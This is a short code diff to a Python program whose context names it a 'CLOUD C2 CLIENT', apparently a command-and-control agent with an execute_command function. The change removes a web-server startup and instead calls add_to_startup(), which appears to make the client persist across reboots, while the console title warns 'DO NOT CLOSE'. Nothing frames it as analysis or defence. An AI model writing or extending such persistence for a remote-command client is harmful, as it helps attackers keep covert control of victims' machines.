@@ -112,8 +112,7 @@ def execute_command(cmd):
 # MAIN
 # ============================================================
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8000))
-    app.run(host='0.0.0.0', port=port)
+    add_to_startup()
     
     if platform.system() == 'Windows':
         os.system(f'title CLOUD C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
